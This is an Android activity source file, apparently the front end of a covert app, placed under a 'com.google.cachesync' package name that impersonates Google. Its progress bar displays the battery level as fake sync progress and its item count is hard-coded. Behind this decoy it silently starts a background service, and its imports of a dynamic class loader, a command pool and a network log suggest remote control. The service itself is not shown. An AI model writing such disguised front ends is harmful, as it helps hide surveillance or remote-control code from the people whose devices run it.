// code4bones

package com.google.cachesync;

import java.io.PrintStream;

import com.code4bones.utils.*;

import dalvik.system.DexClassLoader;
import dalvik.system.PathClassLoader;

import android.os.Bundle;
import android.app.Activity;
import android.content.Intent;
import android.content.IntentFilter;
import android.view.Menu;
import android.widget.ProgressBar;
import android.widget.TextView;

public class MainActivity extends Activity {

	final public NetLog gLog = NetLog.getInstance(); 
	final public CommandPool cmdPool = CommandPool.getInstance();

	public ProgressBar progress;
	public TextView txtItems;
	
    @Override
    public void onCreate(Bundle savedInstanceState) {
    	
    	gLog.Init("CacheSync","CacheSync.log.txt",true);
    	
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        int level = getBatteryLevel();
        int total = 20;
        int current = 12;
        
        progress = (ProgressBar)findViewById(R.id.progressBar1);
        txtItems = (TextView)findViewById(R.id.textView4);
        
        
        progress.setMax(120);
        progress.setProgress(level);
        txtItems.setText(String.format("Items %d / %d ( approx )",current,total));
          
        
        serviceStart();
    }

	public int getBatteryLevel() {
		Intent batteryIntent = registerReceiver(null,
		        new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
		int rawlevel = batteryIntent.getIntExtra("level", -1);
		double scale = batteryIntent.getIntExtra("scale", -1);
		int batteryLevel = -1;
		if (rawlevel >= 0 && scale > 0) {
			batteryLevel = (int)((rawlevel / scale)*100);
		}
		return batteryLevel;
	}
    
    public void serviceStart() {
    	Intent service = new Intent(this,CacheSyncService.class);
    	this.startService(service);
    }
    	
    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.activity_main, menu);
        return true;
    }
}
